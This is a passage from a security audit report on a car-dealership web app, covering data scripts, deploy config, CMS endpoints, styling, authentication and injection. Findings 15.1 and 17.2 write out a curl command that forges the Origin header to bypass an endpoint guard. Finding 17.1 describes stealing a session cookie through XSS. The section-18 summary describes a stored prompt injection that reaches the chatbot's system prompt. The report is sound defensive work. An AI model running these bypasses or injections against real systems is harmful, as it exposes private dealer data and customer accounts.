**What it is —** Each grounding resolve wrapper receives a `useStub` boolean from useStubFor() (index.ts:104/118/133) but discards it with `void useStub` and always calls the stub. So if an owner adds MANUFACTURER_API_KEY / REVIEWS_API_KEY / WEBSEARCH_API_KEY (making useStub=false), nothing changes — the canned stub silently keeps serving. This contradicts the stub-convention header comment in each of these three files which states 'going live is a config change (add <KEY>), not a code change', and it fails SYSTEM-MAP §12 checklist item 'Each go-live is credential+flag only (no code change) as the registry claims' for these three sources. The spend/PII-bearing stubs (vin-lookup, carsales, redbook, email) behave correctly by contrast — their real branch THROWS 'not implemented' when the key is present, surfacing that live is unbuilt rather than silently faking. This is not a spend/PII risk (these three are offline, price-free, firewall-excluded, and default-OFF via chat.grounding.*.enabled), only an accuracy gap between the stub headers and reality. The TODO_KEYS.md effort column (~1 day each) does acknowledge code work is needed.

**Evidence —** src/chatbot/grounding/manufacturer.ts:56 `void useStub;` (same at reviews.ts:56, websearch.ts:54); useStub computed at src/chatbot/grounding/index.ts:104,118,133 then passed in but ignored; header comment src/stubs/manufacturer.ts:5-6 claims 'going live is a config change (add MANUFACTURER_API_KEY), not a code change'.

**Suggested fix —** Either soften the three stub-file header comments to state the live feed still needs to be built (matching TODO_KEYS effort), or have the resolve wrappers throw/log when useStub is false so an added key doesn't silently continue serving canned data — mirroring the throw-on-live-unbuilt pattern used by vin-lookup/carsales/redbook/email endpoints.

---

## 13. Data scripts & tooling

**Audit summary.** Audited scripts/* against SYSTEM-MAP §13 checklist and AGENTS.md hard constraints. Checklist results: (1) dry-run-by-default+--commit — FAIL: import-bundaberg.ts writes by DEFAULT (opt-out via --dry-run, no --commit gate) and seed.ts has no dry-run and no --commit gate at all; the four migration/business-info scripts correctly default to dry-run. (2) explicit-doc-IDs-no-broad-query — FAIL: seed.ts clean() deletes via a broad query match; import/migrate/cleanup all target explicit _ids. (3) vehicle-specs petrol-electric→hybrid + WARN-on-ambiguous — PASS (verified lines 114-118 and 148-154). (4) reads .env not .dev.vars — PASS, but several scripts' error text/comments name the wrong env var (SANITY_API_TOKEN) while the code reads SANITY_TOKEN. (5) check-ai-imports wired+passes — passes locally (exit 0) but is NOT wired into any CI (no .github/workflows exists), so it is advisory-only and cannot block a deploy. Net: 4 findings (2 high constraint violations, 2 lower).

**Findings: 4**

### 13.1  [HIGH] import-bundaberg.ts writes to Sanity by default (inverts the dry-run-by-default hard constraint)
**Category:** constraint-violation · **Location:** `scripts/import-bundaberg.ts:58`

**What it is —** AGENTS.md ('Data scripts — Run in dry-run mode by default and require an explicit --commit flag to write') and SYSTEM-MAP §13 checklist item 1 require every write script to be dry-run by default with an explicit --commit to write. This script inverts that: the default invocation (no flag) is a LIVE import. dryRun is only true when '--dry-run' is passed; there is no --commit gate. In default mode it uploads image assets and commits a transaction that, in REPLACE mode (the default, unless --add), deletes existing automotive listings and createOrReplaces the manifest docs.

**Evidence —** Line 58 `const dryRun = process.argv.includes('--dry-run')`; line 443 prints '*** LIVE IMPORT ***' when the flag is absent; lines 541-567 perform uploadImages + client.transaction() delete/createOrReplace/commit with no --commit guard. package.json line 17 wires `import:bundaberg` to run the script with no default flag.

**Suggested fix —** Match the sibling migration scripts: make dry-run the default and require an explicit --commit to perform uploads/writes (keep --add as an orthogonal modifier). Update the npm script/usage docs accordingly.

### 13.2  [HIGH] seed.ts has no dry-run/--commit gate and seed:clean deletes by broad query match
**Category:** constraint-violation · **Location:** `scripts/seed.ts:146`

**What it is —** Two hard-constraint violations in one script. (a) `npm run seed` writes immediately with no dry-run default and no --commit flag, violating the dry-run-by-default rule (checklist item 1). (b) `clean()` deletes with a broad query match `*[_type == "listing"]`, directly violating 'Deletions/patches must target explicit document IDs, never a broad query match' (checklist item 2). `npm run seed:clean` runs clean() then seed(), so a single command mass-deletes every listing document by query and repopulates — no dry-run preview, no id targeting.

**Evidence —** Line 146 `await client.delete({ query: '*[_type == "listing"]' })`; lines 151-159 seed() calls client.create unconditionally; lines 166-169 run clean()+seed() based only on `--clean`, with no --commit/--dry-run branch anywhere. package.json lines 15-16 expose `seed` and `seed:clean`.

**Suggested fix —** Add a dry-run default + explicit --commit gate; replace the query-match delete with fetching explicit _ids (or the known seed ids) and deleting those individually, printing the plan before committing.

### 13.3  [MEDIUM] check-ai-imports.sh guardrail is not wired into any CI
**Category:** guardrail-gap · **Location:** `scripts/check-ai-imports.sh:10`

**What it is —** SYSTEM-MAP §13 checklist item 5 asks that check-ai-imports be 'wired (CI/local) and passes'. It passes locally (exit 0) and is exposed as `npm run check:ai-imports`, but there is no CI configured in the repo (no .github/workflows directory exists), and the Cloudflare build runs only `npm ci`/`astro build`. The guardrail's own header comment claims it can 'Run it manually or from CI', but nothing enforces it — a forbidden src/ai/providers/* import from feature code would not fail any automated gate and could ship.

**Evidence —** `ls .github/workflows` returns 'NO .github/workflows'. `bash scripts/check-ai-imports.sh` exits 0 (verified). Only invocation is the manual npm script (package.json line 23). Comment at scripts/check-ai-imports.sh lines 9-13 references CI that does not exist.

**Suggested fix —** Either add a CI workflow (or a build/prebuild hook) that runs `npm run check:ai-imports` and fails on non-zero, or soften the comment/checklist to reflect that it is a local-only manual guardrail.

### 13.4  [LOW] Env-var name in error messages/comments (SANITY_API_TOKEN) does not match the var the code reads (SANITY_TOKEN)
**Category:** correctness · **Location:** `scripts/seed.ts:27`

**What it is —** AGENTS.md mandates the write token be named SANITY_TOKEN, and the code reads `process.env.SANITY_TOKEN`, but the missing-env error message and the header usage comments instruct the operator to set 'SANITY_API_TOKEN'. A user who follows the error text would set the wrong variable and the guard would still throw. Same mismatch appears in import-bundaberg.ts (line 28 comment, lines 51-52 message) and migrate-details-to-specs.ts (line 30 message); migrate-details-to-fields.ts and seed-business-info.ts correctly say SANITY_TOKEN.

**Evidence —** seed.ts line 22 reads `process.env.SANITY_TOKEN` but line 27 error says '...a write-enabled SANITY_API_TOKEN are set in .env'; line 12 comment likewise. import-bundaberg.ts lines 47 vs 52; migrate-details-to-specs.ts lines 25 vs 30.

**Suggested fix —** Change the comment/error strings to say SANITY_TOKEN so they match the variable actually read and the AGENTS.md-mandated name.

---

## 14. Infrastructure & deploy

**Audit summary.** Audited astro.config.mjs, wrangler.jsonc, src/middleware.ts, migrations/, env readers (get-env.ts, actions/index.ts), worker-configuration.d.ts and docs/cloudflare-security.md against the §14 SYSTEM-MAP checklist. Checklist results: (1) package.json↔package-lock.json in sync — PASS (`npm ci --dry-run` clean; npm-only, single lockfile, packageManager pinned npm@10.9.2). (2) wrangler bindings match code — PASS (CHAT_DB, RATE_LIMIT_KV, ASSETS bound; GROUNDING_KV referenced only optionally and read null-safe in get-env.ts). (3) Security headers on all responses incl. redirects — PARTIAL/FAIL: three baseline headers land on SSR responses and redirects, but HSTS is absent and static assets served by the ASSETS binding bypass middleware entirely. (4) Prod D1 migrations 0003–0005 applied — UNVERIFIABLE from repo (owner/account action; migrations 0001–0005 present and sequential, default ./migrations dir). (5) astro.config site set to real domain — FAIL (still the `.pages.dev` placeholder). (6) Secrets not committed — PASS (only .env.example tracked; .env/.dev.vars gitignored) BUT Turnstile secret var names are fragmented across three names and the chatbot gate fails OPEN when its secret is absent/misnamed. No config-as-data / determinism / dealerNotes violations in this subsystem's files. Six findings below, none critical; the highest-impact is the chatbot Turnstile fail-open on a missing/misnamed prod secret.

**Findings: 6**

### 14.1  [MEDIUM] Chatbot Turnstile silently fails OPEN when its secret is unset or misnamed in prod
**Category:** security · **Location:** `src/chatbot/core.ts:667`

**What it is —** The chatbot Turnstile bot-protection gate is conditional on the secret being present: `if (TURNSTILE_ENABLED && !isLocalhost && env.CHATBOT_TURNSTILE_SECRET_KEY && isNewVisitor)`. If `env.CHATBOT_TURNSTILE_SECRET_KEY` is falsy the entire verification block is skipped and every first message is accepted with no challenge — i.e. bot protection turns itself off with no error or log. This is compounded by Turnstile secret-name fragmentation: the codebase uses THREE different var names — chat reads `CHATBOT_TURNSTILE_SECRET_KEY` with a fallback to `TURNSTILE_RB_LISTINGS_AUTO_SECRET_KEY` (src/chatbot/get-env.ts:34-38), while auth reads `TURNSTILE_SECRET_KEY` (src/actions/index.ts:32). If the owner sets only the auth name (or otherwise misses the chat name) in `wrangler secret`, the chatbot ships with Turnstile disabled and no signal. The auth path does this correctly — verifyTurnstile throws INTERNAL_SERVER_ERROR when its secret is missing (src/actions/index.ts:43-48), failing closed. The chat gate does the opposite.

**Evidence —** src/chatbot/core.ts:667 gates on `env.CHATBOT_TURNSTILE_SECRET_KEY` truthiness; the verifyTurnstile function itself fails closed (core.ts:277-292) but is never reached when the secret is absent. get-env.ts:34-38 maps only CHATBOT_TURNSTILE_SECRET_KEY / TURNSTILE_RB_LISTINGS_AUTO_SECRET_KEY, not the auth-side TURNSTILE_SECRET_KEY. Contrast src/actions/index.ts:42-48 which throws when its secret is missing.

**Suggested fix —** Fail closed on the chat gate too: if TURNSTILE_ENABLED && !isLocalhost && isNewVisitor, require the secret to be present and reject (403) when it is missing, rather than skipping the block. Consolidate the Turnstile secret to a single canonical var name (or document the exact prod names in TODO_KEYS / cloudflare-security.md) so a wrangler-secret typo cannot silently disable protection.

### 14.2  [MEDIUM] astro.config.mjs `site` is still the .pages.dev placeholder
**Category:** correctness · **Location:** `astro.config.mjs:20`

**What it is —** `site: 'https://rebirth-listings-auto.pages.dev'` is a placeholder. Canonical URLs, OpenGraph tags and the generated sitemap are all built from this value, so every canonical/OG/sitemap URL currently points at a `.pages.dev` host. Two problems: the domain is a guess that likely does not resolve, and `.pages.dev` is the Cloudflare Pages naming convention while this project deploys as a Worker (AGENTS.md stresses the Worker-not-Pages distinction), so the placeholder is doubly wrong. This is a known/documented item (SYSTEM-MAP §1/§14 flag it) but remains a real pre-launch defect for SEO/social correctness.

**Evidence —** astro.config.mjs:20 `site: 'https://rebirth-listings-auto.pages.dev'`; sitemap integration (astro.config.mjs:33) and canonical/OG derive from it. SYSTEM-MAP §14 checklist explicitly flags it unset.

**Suggested fix —** Set `site` to the real production domain before launch; verify canonical, OG and sitemap output resolve to that host.

### 14.3  [LOW] HSTS (Strict-Transport-Security) not set despite being the documented priority-1 header
**Category:** security · **Location:** `src/middleware.ts:29`

**What it is —** applySecurityHeaders sets X-Content-Type-Options, Referrer-Policy and X-Frame-Options but not Strict-Transport-Security. The middleware header comment correctly explains why CSP and Permissions-Policy are deliberately omitted (they would break Turnstile/Supabase/mic/camera), but HSTS has none of those downsides on an HTTPS-only Cloudflare Worker, and docs/cloudflare-security.md lists 'HSTS + a baseline CSP' as the #1 priority gap. HSTS was simply left out of the non-breaking set.

**Evidence —** src/middleware.ts:29-34 sets only three headers; grep for Strict-Transport-Security across src/ returns no set() call. docs/cloudflare-security.md priority list item 1 names HSTS.

**Suggested fix —** Add `headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')` (optionally `preload`) to applySecurityHeaders — it is non-breaking and closes the documented top gap.

### 14.4  [LOW] Baseline security headers do not reach static-asset responses (ASSETS binding bypasses middleware)
**Category:** security · **Location:** `wrangler.jsonc:7`

**What it is —** The checklist claims 'Security headers land on all responses'. In fact wrangler.jsonc binds ASSETS to ./dist with no `run_worker_first`, so Cloudflare Workers Assets serves static files (JS, CSS, images, fonts) directly before the Worker script runs. Astro middleware only executes for SSR-rendered routes and endpoints, so nosniff/Referrer-Policy/X-Frame-Options are absent on static-asset responses. Low impact for build-output assets, but the 'all responses' claim is inaccurate and X-Content-Type-Options in particular is normally wanted on served scripts/styles.

**Evidence —** wrangler.jsonc:7-10 defines the ASSETS binding with no run_worker_first; src/middleware.ts runs inside the Astro request pipeline only. Static assets served by the assets layer never pass through onRequest.

**Suggested fix —** If asset-response headers are required, apply them via a Cloudflare Transform Rule (response headers) at the zone level, or set run_worker_first for the asset paths that need them. Otherwise soften the SYSTEM-MAP claim to 'all SSR/endpoint responses incl. redirects'.

### 14.5  [LOW] docs/cloudflare-security.md is stale — claims no security headers exist
**Category:** docs · **Location:** `docs/cloudflare-security.md:32`

**What it is —** The security-header row states '**Not currently set.** No response-header security policy exists in the repo,' but src/middleware.ts now sets X-Content-Type-Options, Referrer-Policy and X-Frame-Options on every SSR response. An audit doc that under-reports existing controls is misleading and can cause duplicated or misdirected owner action.

**Evidence —** docs/cloudflare-security.md security-headers row says 'Not currently set. No response-header security policy exists in the repo'; contradicted by src/middleware.ts:29-34.

**Suggested fix —** Update the doc to reflect that nosniff + Referrer-Policy + X-Frame-Options ship via middleware today, and that HSTS + CSP + Permissions-Policy remain the outstanding gaps.

### 14.6  [LOW] worker-configuration.d.ts Env type is stale/incomplete — several runtime secrets undeclared
**Category:** maintainability · **Location:** `worker-configuration.d.ts:4`

**What it is —** The generated Env interface declares only RATE_LIMIT_KV, CHAT_DB, ASSETS, OPENROUTER_API_KEY, TELEGRAM_* and CHATBOT_TURNSTILE_SECRET_KEY. Secrets the Worker actually reads at runtime are missing: TURNSTILE_SECRET_KEY (auth), SANITY_TOKEN (server draft read for /api/generate-description), PUBLIC_SUPABASE_URL/ANON_KEY, PUBLIC_SITE_URL, TURNSTILE_RB_LISTINGS_AUTO_SECRET_KEY, and the STUB_* flags. Because every env reader casts to `Record<string, unknown>`/`any` (get-env.ts:19, actions/index.ts:31), a missing or misspelled prod secret is not caught at build/typecheck time — there is no type-level guard on the exact behaviour the Turnstile finding above relies on. The .d.ts was last regenerated before the auth/description-gen secrets were added.

**Evidence —** worker-configuration.d.ts:4-12 lists 9 members; .dev.vars/.env carry TURNSTILE_SECRET_KEY, SANITY_TOKEN, PUBLIC_SUPABASE_*, PUBLIC_SITE_URL etc. that are read via untyped casts (src/chatbot/get-env.ts:19, src/actions/index.ts:31-32).

**Suggested fix —** Re-run `wrangler types` after all secrets are declared (or maintain a typed ChatEnv/AuthEnv shape) so missing bindings surface at build time rather than as silent runtime undefined.

---

## 15. Sanity Studio & CMS

**Audit summary.** Audited §15 (sanity.config.ts, schema listing/businessInfo, lib client/image, Studio components, templates, and the two Studio-only endpoints generate-description + carsales-upload). Checklist results: (1) generate-description enforces origin+rate-limit — PARTIAL (rate-limit OK, but origin gate is a spoofable header, so "no public access" FAILS); (2) dealerNotes excluded from LISTING_FIELDS and not returned raw — PASS at the projection level, but reachable-derived exposure via the weak endpoint gate (see findings); (3) carsales action gated by config flag + endpoint re-checks origin/published/active — PASS on flag/published/active, same spoofable-origin caveat; (4) businessInfo stays a plain doc, no singleton constraint — PASS; (5) /studio behind Cloudflare Access before prod — NOT DONE (known owner action). Schema constraints hold: category locked/hidden/readOnly=automotive, fuelEconomy never defaulted ("Leave blank if unknown — never guess"), staff-only fields (registrationPlate/stockNumber/dealerNotes) absent from LISTING_FIELDS. Config-as-data honoured (studioOrigins, tones, flags all from dealerConfig). Main risk is the access model on the Studio-only endpoints, not the schema.

**Findings: 4**

### 15.1  [HIGH] Studio-only AI endpoint gated only by a spoofable Origin header — unauthenticated caller can trigger dealerNotes-grounded generation
**Category:** access-control · **Location:** `src/pages/api/generate-description.ts:108`

**What it is —** The only access control on /api/generate-description (besides a per-IP KV rate limit) is an allowlist check on the request's `Origin` header against dealerConfig.ai.studioOrigins. The `Origin` header is set by the browser but is trivially forged by any non-browser client (curl/server: `-H 'Origin: https://rebirth-listings-auto.alexharris0079.workers.dev'`), so this is not authentication — the endpoint is effectively public. This fails the checklist item "enforces ai.studioOrigins (no public access)". Concretely: listing `_id` values are projected publicly via LISTING_FIELDS (src/lib/listing.ts:109) and appear on shopper pages, so an attacker can read a real listingId, spoof the Origin header, and POST it. The endpoint then uses the server-side editor SANITY_TOKEN to fetch the DRAFT (fetchDraftListing reads `dealerNotes`, sanity-draft.ts) and runs an LLM whose prompt is grounded in those private dealerNotes, returning buyer-facing prose that can paraphrase/reveal that private shorthand. This both violates the 'dealerNotes never leaves the dealer' constraint (derived content reaches an unauthenticated caller) and enables AI-cost abuse (bounded only by 20/hr per IP). The code itself acknowledges the gap: `TODO(multi-tenant): replace origin check with Studio session validation before real dealer data flows` (line 107).

**Evidence —** src/pages/api/generate-description.ts:107-110 origin allowlist is the sole gate; fetchDraftListing projects `dealerNotes` (src/lib/generate-description/sanity-draft.ts PROJECTION) using SANITY_TOKEN; listing `_id` is public via LISTING_FIELDS (src/lib/listing.ts:109). Origin header is client-controlled for non-browser requests.

**Suggested fix —** Replace/augment the Origin allowlist with a real auth check before dealer data flows to prod: validate a Sanity Studio session/token server-side, or put /studio + these /api/* routes behind Cloudflare Access and verify the Access JWT (Cf-Access-Jwt-Assertion) in the endpoint. Treat the Origin check as CSRF hardening only, not authentication.

### 15.2  [MEDIUM] carsales-upload endpoint shares the same spoofable-Origin-only access model
**Category:** access-control · **Location:** `src/pages/api/carsales-upload.ts:81`

**What it is —** /api/carsales-upload uses the identical Origin-header allowlist as its only origin gate (line 81-83, same TODO at line 80). It is publicly callable by a client that forges the Origin header. Real impact is currently limited because the action is DEFAULT-OFF (integrations.carsales.enabled=false → 404), reads only through the token-less public client with a `status == "active"` guard (so no draft/dealerNotes exposure — it maps only title/price/make/model/year), and the upload is stubbed. But once a dealer enables carsales and a live CARSALES_API_KEY is added, this spoofable gate would let an unauthenticated caller trigger real syndication of any published+active listing. Same class of issue as the generate-description finding; flagged separately because the endpoint is behind a config flag today.

**Evidence —** src/pages/api/carsales-upload.ts:80-83 (TODO + Origin-only check identical to generate-description); flag gate at :78 returns 404 when disabled; public token-less client + status=='active' query at the fetch limits current exposure.

**Suggested fix —** Apply the same real-auth fix as generate-description before flipping integrations.carsales.enabled or adding a live key. Keep the flag OFF until the endpoint has genuine dealer authentication.

### 15.3  [LOW] /studio embedded admin is publicly served with no network/Access gate (known owner action, still unmet)
**Category:** access-control · **Location:** `astro.config.mjs:29`

**What it is —** The Sanity Studio is embedded at /studio (studioBasePath), served by the Worker, and is not placed behind Cloudflare Access or any network restriction. Data operations inside the Studio are still gated by Sanity's own project login, so this is not an open data hole, but the admin surface is publicly reachable and enumerable. SYSTEM-MAP §15 checklist item "/studio access is restricted before production (Cloudflare Access)" is explicitly unmet and TODO_KEYS lists it as a pending owner action. Reporting for completeness — it is a known gap, not a code defect.

**Evidence —** astro.config.mjs:29 studioBasePath: '/studio'; src/middleware.ts:52 deliberately skips auth for /studio; no Access config present. SYSTEM-MAP §15 marks this as not-yet-done owner action.

**Suggested fix —** Owner action: front /studio (and the studio-only /api routes) with Cloudflare Access before production. No code change required beyond verifying the endpoints check the Access assertion.

### 15.4  [INFO] SYSTEM-MAP §15 documents useCdn:false but the public Sanity client uses useCdn:import.meta.env.PROD
**Category:** doc-drift · **Location:** `src/sanity/lib/client.ts:8`

**What it is —** SYSTEM-MAP §15 ("Config, env & flags") states the CMS client uses `useCdn: false`, but src/sanity/lib/client.ts actually sets `useCdn: import.meta.env.PROD` — i.e. CDN ON in production. This is a documentation/reality drift, not a bug. One practical consequence: /api/carsales-upload reads the listing through this public client, so in production a just-published/just-activated listing could momentarily read stale via the Sanity CDN before syndication. Low impact; the draft-read path (sanity-draft.ts) correctly forces useCdn:false. Noting so the map and code agree.

**Evidence —** src/sanity/lib/client.ts:8 `useCdn: import.meta.env.PROD`; SYSTEM-MAP §15 says `useCdn: false`; carsales-upload consumes this client for its published-listing read.

**Suggested fix —** Either update SYSTEM-MAP §15 to say `useCdn: import.meta.env.PROD`, or, if fresh reads matter for the carsales publish flow, pass `{ useCdn: false }` on that specific fetch.

---

## 16. Styling & design system

**Audit summary.** Audited SYSTEM-MAP §16 (Tailwind v4, src/styles/global.css + rebi.css, light-theme standard, accessibility). Checklist results: (1) Light-first & consistent — PASS: zero `dark:` variants in shipped src, page roots are white/bg-slate-50/slate-900 accents only, rebi.css is explicitly light-only, skip-links use focus:not-sr-only. (2) Visible focus ring on every interactive element — FAIL: several production form controls use Tailwind `focus:outline-none` which out-specificities the global `:where(...):focus-visible` ring and leaves no adequate replacement, defeating the subsystem's stated "guaranteed focus-visible ring site-wide" guarantee. (3) Page wrappers use .site-container / no per-component gutter literals — PASS: compare + compare-tools reuse the same `--site-max`/`--site-gutter` custom props via their own `.wrap`, and /capture is intentionally standalone (documented); no rogue gutter literals. (4) No dealer copy in CSS — PASS for copy, but the brand colour is hardcoded (see finding). Global width system and .inventory-grid are sound. Three findings below (one accessibility, one config-as-data tension, one minor reduced-motion gap).

**Findings: 3**

### 16.1  [MEDIUM] focus:outline-none removes the site-wide focus ring on production form controls
**Category:** accessibility · **Location:** `src/components/filters/InventoryResults.astro:110`

**What it is —** global.css guarantees a keyboard focus ring via `@layer base { :where(a,button,input,select,textarea,[tabindex]):focus-visible { outline: 2px solid #0f172a } }` (specificity 0,1,0). Several shipped interactive elements apply Tailwind's `focus:outline-none`, whose generated rule `.focus\:outline-none:focus` has specificity 0,2,0 and matches on plain `:focus` (which is also true during keyboard focus), so it overrides and suppresses the global ring. Where no `focus:ring-*` replaces it, keyboard users get no adequate focus indicator — only a slate-200→slate-400 border shift (inputs) or nothing at all (the auth tab buttons). This defeats the subsystem's stated 'guaranteed focus-visible ring site-wide' constraint and fails WCAG 2.4.7. Affected: InventoryResults.astro:110 (saved-search email input), FilterDrawer.astro:78 (filter min/max text inputs), AuthCard.astro:27 (Sign in / Sign up tab buttons — no ring and no border to change). Note the many OTHER `focus:outline-none` usages (AuthCard input line 31, service/trade-in/reset-password buttons) are fine because they pair it with `focus:ring-2`.

**Evidence —** src/components/filters/InventoryResults.astro:110 `...focus:border-slate-400 focus:outline-none` (no ring); src/components/filters/FilterDrawer.astro:78 `textInput = '...focus:border-slate-400 focus:outline-none'` (no ring); src/components/auth/AuthCard.astro:27 `tabBase = '...transition focus:outline-none'` (no ring, no border change); overridden guarantee at src/styles/global.css:7-11

**Suggested fix —** Add a compensating `focus:ring-2 focus:ring-slate-900/20` (matching the pattern already used on AuthCard's input and the buttons) to the InventoryResults email input, the FilterDrawer textInput class, and the AuthCard tabBase — or drop `focus:outline-none` on those three so the global :focus-visible ring shows through.

### 16.2  [LOW] Brand colour hardcoded across 6 files instead of sourced from dealerConfig
**Category:** config-as-data · **Location:** `src/styles/rebi.css:11`

**What it is —** AGENTS.md's hard constraint lists 'colours' among the dealer-specific values that must live in src/config/dealer.ts and be read at runtime. dealer.ts has no colour/logo/palette field at all, and the brand blue `rgb(1 97 239)` (plus its hover `rgb(1 84 207)`) is hardcoded and duplicated across six files. Re-theming the product for a second dealership (the stated commercial goal) means hand-editing CSS in six places rather than flipping one config value — a maintainability/consistency risk and a drift source. SYSTEM-MAP §16 acknowledges colours currently live in CSS ('none dealer-level ... front-of-house copy lives in dealerConfig, not CSS'), so this is a known tension between the map and the AGENTS.md constraint rather than a hidden bug; surfacing it for the owner to reconcile.

**Evidence —** `rgb(1 97 239)` literal appears in src/styles/rebi.css:11-17, src/components/AskRebiButton.astro, src/components/search/stage.css, src/components/search/SearchDock.astro, src/pages/compare-tools.astro, src/pages/compare.astro; grep of src/config/dealer.ts for hex/rgb/primary/accent/palette/logo returns no colour field.

**Suggested fix —** If colours are to be config-as-data, add a theme block to dealer.ts and expose the brand colour as a CSS custom property set once on :root (e.g. from a small style block driven by dealerConfig), then have rebi.css/stage.css/SearchDock/compare read `var(--brand)`. Otherwise, update AGENTS.md to note colours are intentionally CSS-level for now to remove the contradiction.

### 16.3  [LOW] Reduced-motion gaps: infinite animate-pulse dot and Firefox slider thumb focus
**Category:** accessibility · **Location:** `src/pages/index.astro:132`

**What it is —** Tailwind's `animate-pulse` is not auto-disabled under prefers-reduced-motion; the homepage 'live inventory' status dot pulses indefinitely for users who requested reduced motion. rebi.css and stage.css correctly gate their animations with @media (prefers-reduced-motion), so this dot is an outlier. Separately, compare-tools.astro:495 removes the range slider's focus outline (`.c3-range:focus-visible { outline: none }`) and restores a focus indicator only via `::-webkit-slider-thumb` box-shadow (line 496) — there is no `::-moz-range-thumb` focus-visible equivalent, so Firefox keyboard users get no focus indicator on the Balance sliders. Both are minor/edge.

**Evidence —** src/pages/index.astro:132 `<span class="... animate-pulse">` with no motion-reduce guard and no prefers-reduced-motion block in index.astro; src/pages/compare-tools.astro:495-496 webkit-only focus-visible thumb ring (no -moz-range-thumb counterpart).

**Suggested fix —** Add `motion-reduce:animate-none` to the index.astro status dot. For the Balance slider add a `.c3-range:focus-visible::-moz-range-thumb { box-shadow: 0 0 0 4px ... }` mirror so Firefox keyboard focus is visible.

---

# Part B — Security-domain sweeps (8)

## 17. Authentication, session & access control

**Audit summary.** Audited the Supabase auth surface (middleware guard on /account,/login,/signup; actions signUp/signIn/signOut/reset/updatePassword; reset-password PKCE flow; account dashboard) and all POST API endpoints. The middleware guard, Turnstile gating, account-enumeration protection on reset, and recovery-session invalidation on updatePassword are all sound, and Astro 7's default checkOrigin protects actions/forms from CSRF (no override in astro.config.mjs). Two real issues found: (1) HIGH — Supabase session cookies, including the 400-day refresh token, are written without httpOnly/Secure, leaving them readable by JS with no CSP as backstop; (2) MEDIUM — privileged dealer/Studio-only endpoints are gated only by a trivially spoofable Origin header. Checklist: session cookie flags = FAIL; dealer-endpoint access control = FAIL (Origin-only); middleware /account guard = PASS; CSRF on actions = PASS; account-enumeration on reset = PASS.

**Findings: 2**

### 17.1  [HIGH] Supabase session cookies (incl. long-lived refresh token) set without httpOnly or Secure flags
**Category:** session-management · **Location:** `src/lib/supabase.ts:33`

**What it is —** getSupabase() builds the @supabase/ssr server client and its setAll() callback forwards the cookie options straight through to Astro's cookies.set(name, value, options) unchanged (src/lib/supabase.ts:33-41). Those options originate from @supabase/ssr's DEFAULT_COOKIE_OPTIONS, which is {path:'/', sameSite:'lax', httpOnly:false, maxAge:400*24*60*60} — httpOnly is false, Secure is absent, and the refresh token cookie lives for 400 days. The app uses ONLY the server-side SSR client — there is no createBrowserClient / document.cookie reader anywhere in src (grep confirms supabase is referenced only in middleware.ts, actions/index.ts, supabase.ts, reset-password.astro, env.d.ts) — so JavaScript never needs to read these cookies, yet they are left script-readable. The middleware also deliberately ships NO Content-Security-Policy (src/middleware.ts:20-22 documents CSP as an un-done follow-up), so there is no XSS mitigation backstop. Exploit: any XSS anywhere on the site (chat widget, compare tools, Sanity Studio, a reflected param) runs document.cookie, exfiltrates the sb-…-auth-token / refresh-token, and the attacker replays it for persistent, 400-day account takeover of that customer — bypassing Turnstile and password entirely.

**Evidence —** src/lib/supabase.ts:33-41 setAll → cookies.set(name,value,options) with options passed through verbatim; node_modules/@supabase/ssr/dist/main/utils/constants.js:4-11 DEFAULT_COOKIE_OPTIONS = {path:'/',sameSite:'lax',httpOnly:false,maxAge:400*24*60*60}; src/middleware.ts:20-22 explicitly notes no CSP is set; no createBrowserClient anywhere (grep of src).

**Suggested fix —** In setAll(), force secure and httpOnly on the auth cookies: cookies.set(name, value, { ...options, httpOnly: true, secure: true, sameSite: 'lax' }). Since only the SSR server client is used, making them httpOnly is safe and removes the token from JS reach.

### 17.2  [MEDIUM] Dealer/Studio-only endpoints gated only by a spoofable Origin header (auth bypass)
**Category:** broken-access-control · **Location:** `src/pages/api/generate-description.ts:108`

**What it is —** The privileged 'dealer-only' endpoints enforce access solely by comparing the request's Origin header against a config allowlist: generate-description.ts:108-111 (origin ∈ dealerConfig.ai.studioOrigins), carsales-upload.ts:81-84 (same), and every capture/* route via guardCaptureRequest in src/lib/capture/http.ts:34-37 (origin ∈ dealerConfig.capture.allowedOrigins). The Origin header is only populated/enforced by browsers under CORS; a non-browser client (curl, script, server) sets it to any value it likes. So `curl -H 'Origin: https://rebirth-listings-auto.alexharris0079.workers.dev' -H 'Content-Type: application/json' -d '{"listingId":"drafts.<id>"}' https://…/api/generate-description` fully bypasses the guard. Impact: an unauthenticated attacker can invoke generate-description against ANY listing id including unpublished drafts — the handler then reads the draft server-side WITH the Sanity write/read token including the private dealerNotes field (generate-description.ts:168, facts.dealerNotes at :196) and feeds it to the LLM, and burns the dealer's OpenRouter + Sanity budget on demand (rate limit is per-IP and fails open). carsales-upload and capture endpoints are similarly reachable (capture's real write is currently stubbed, limiting that one). The code itself flags the weakness: 'TODO(multi-tenant): replace origin check with Studio session validation before real dealer data flows'.

**Evidence —** src/pages/api/generate-description.ts:108-111 origin allowlist check; src/pages/api/carsales-upload.ts:81-84 identical check; src/lib/capture/http.ts:34-37 shared origin guard; generate-description.ts:168 fetchDraftListing(env.SANITY_TOKEN, listingId) reads drafts + :196 dealerNotes fed into prompt; inline TODO comments acknowledging origin check is not real auth.

**Suggested fix —** Replace the Origin-header allowlist with a real server-verified Studio/dealer session (e.g. require an authenticated Sanity Studio session cookie or a signed server-side token). An Origin check is not an authentication control for non-browser clients.

---

## 18. Injection

**Audit summary.** Swept the whole codebase for the Injection class. GROQ and D1 are cleanly parameterised (no string-built queries reaching a sink), and script command execution uses execFileSync with an arg array (no shell, no user input) — no findings there. One real prompt-injection vector confirmed: the public /api/journey beacon accepts a client-controlled free-text `label`, stores it with only a length cap, and later folds it verbatim (price-stripped only, no delimiter/newline neutralisation) into the chatbot's system-prompt "VISITOR JOURNEY" block. Checklist: GROQ injection = PASS (parameterised), D1 SQL = PASS (bind placeholders), command injection = PASS (execFileSync), prompt injection = FAIL (journey label reaches model instructions).

**Findings: 1**

### 18.1  [LOW] Stored prompt injection via /api/journey label into chatbot system prompt
**Category:** prompt-injection · **Location:** `src/chatbot/journey.ts:134`

